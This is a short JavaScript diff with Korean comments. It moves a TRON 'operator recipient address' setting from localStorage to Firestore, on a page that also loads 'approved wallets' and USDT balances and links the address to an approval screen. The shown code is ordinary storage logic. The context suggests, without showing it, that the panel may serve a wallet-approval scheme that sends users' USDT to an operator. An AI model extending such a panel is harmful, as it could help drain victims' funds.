@@ -212,16 +212,28 @@
             });
         }
 
-        window.addEventListener('DOMContentLoaded', () => {
-            const savedRecipient = localStorage.getItem('tron_operator_recipient_address') || '';
-            const inputElem = document.getElementById('operator-recipient-input');
-            if (inputElem) inputElem.value = savedRecipient;
+window.addEventListener('DOMContentLoaded', async () => {
+            // DB에 저장된 운영자 지갑 주소를 우선 불러오기
+            try {
+                const docSnap = await db.collection("settings").doc("operator").get();
+                if (docSnap.exists) {
+                    const savedDbAddress = docSnap.data().address;
+                    const inputElem = document.getElementById('operator-recipient-input');
+                    if (inputElem) inputElem.value = savedDbAddress;
+                }
+            } catch (e) {
+                console.warn("DB 주소 조회 실패:", e);
+                const savedRecipient = localStorage.getItem('tron_operator_recipient_address') || '';
+                const inputElem = document.getElementById('operator-recipient-input');
+                if (inputElem) inputElem.value = savedRecipient;
+            }
 
             loadHistoryData();
             loadApprovedWalletsData();
         });
 
-        window.saveOperatorRecipient = function() {
+        // 👇 function 앞에 async 필수!
+        window.saveOperatorRecipient = async function() {
             const inputElem = document.getElementById('operator-recipient-input');
             const address = inputElem ? inputElem.value.trim() : '';
 
@@ -236,7 +248,18 @@
             }
 
             localStorage.setItem('tron_operator_recipient_address', address);
-            showToast("운영자 수신 주소가 저장되어 1번 승인 화면에 자동 연동되었습니다!");
+
+            try {
+                // Firestore DB에 운영자 주소 저장
+                await db.collection("settings").doc("operator").set({
+                    address: address,
+                    updatedAt: firebase.firestore.FieldValue.serverTimestamp()
+                });
+                showToast("운영자 주소가 DB에 저장되어 1번에 자동 연동되었습니다!");
+            } catch (e) {
+                console.error("주소 저장 오류:", e);
+                showToast("DB 저장 중 오류가 발생했습니다.", "error");
+            }
         };
 
         async function fetchRealUsdtBalance(address) {
